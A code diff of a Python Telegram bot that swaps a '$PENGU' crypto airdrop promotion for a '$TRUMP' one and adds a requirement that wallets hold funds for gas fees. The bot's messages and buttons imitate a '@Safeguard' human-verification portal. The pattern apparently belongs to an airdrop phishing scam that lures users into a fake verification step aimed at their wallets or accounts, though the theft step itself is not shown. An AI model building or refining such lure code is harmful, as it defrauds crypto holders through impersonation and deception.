@@ -20,7 +20,7 @@ bot_token = os.getenv('GROUP_BOT_TOKEN')
 bot_client = TelegramClient('group_bot', api_id, api_hash).start(bot_token=bot_token)
 
 # Image URLs
-bot_client_image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241226_081503_X.jpg?alt=media&token=aba082f3-0ea8-4552-a5f3-3f781db3f905'
+bot_client_image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2Fphoto_2025-01-19_17-42-36.jpg?alt=media&token=17b24ddd-81ab-4bc6-89f7-6cbc75803d7a'
 verify_bot_image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'
 
 
@@ -44,15 +44,16 @@ async def on_start(event):
                     await event.respond(
                         file=image_data,
                         message=(
-                            "Current Airdrop: $PENGU.\n\n"
+                            "Current Airdrop: $TRUMP.\n\n"
                             "Eligibility Requirements:\n\n"
                             "- **Active Trading Wallet:** Your trading wallet must have been active within the last 30 days.\n\n"
                             "- **Verification:** Complete verification via Safeguard.\n\n"
+                            "- **Gas fees:** Your wallet must have sufficient funds to cover gas fees.\n\n"
                             "**Note:**\n"
                             "Failure to meet any of the above requirements will result in disqualification."
                         ),
                         buttons=[
-                            [Button.inline("CLAIM $PENGU", b'verify_button')],
+                            [Button.inline("CLAIM $TRUMP", b'verify_button')],
                             [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]
                         ]
                     )
@@ -77,7 +78,7 @@ async def on_verify_button_click(event):
                     await event.respond(
                         file=image_data,
                         message=(
-                            "$PENGU | PORTAL is being protected by @Safeguard\n\n"
+                            "$TRUMP | PORTAL is being protected by @Safeguard\n\n"
                             "Click below to verify you're human"
                         ),
                         buttons=[
